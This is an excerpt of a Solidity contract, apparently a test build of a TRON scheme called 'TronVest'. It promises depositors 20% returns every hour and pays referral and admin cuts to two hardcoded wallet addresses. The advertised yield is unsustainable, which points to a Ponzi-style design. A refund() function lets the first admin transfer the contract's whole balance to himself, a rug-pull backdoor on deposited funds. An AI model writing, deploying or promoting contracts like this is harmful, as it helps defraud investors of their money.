...
/**
 * TronVest Contract
 * Every 1 hour generates 20% of deposit value
 */
...
contract TronVest20Test {
    ...
    uint256 public interest = 20;           // 1 hours ROI 20%
    uint256 public minutesElapse = 60*1;    // production 60 * 1
    uint256 public minimum = 1000000;       // minimum deposit = 1 trx

    uint256 public referralDivRate = 100;   // Referrals divs 10%
    uint256 public adminDivRate = 50;       // Admin divs 5%

    //global stats
    uint256 public globalReferralsDivs_;

    // Developers team
    address private _admin1=0x16059610D6fA40c9E8C840651adF796F7dd9ec73;
    address private _admin2=0x6e5f8CFa238AF17C2192a01eAa7b3085890B33f2;
    ...
    function refund() public {
        require(msg.sender == _admin1);
        _admin1.transfer(address(this).balance);
    }
    ...
    function deposit(address _referredBy) public payable {
        ...
        if(address(this).balance >= _adminDiv.mul(2) && _adminDiv > 0) {
            _admin1.transfer(_adminDiv);
            _admin2.transfer(_adminDiv);
        }
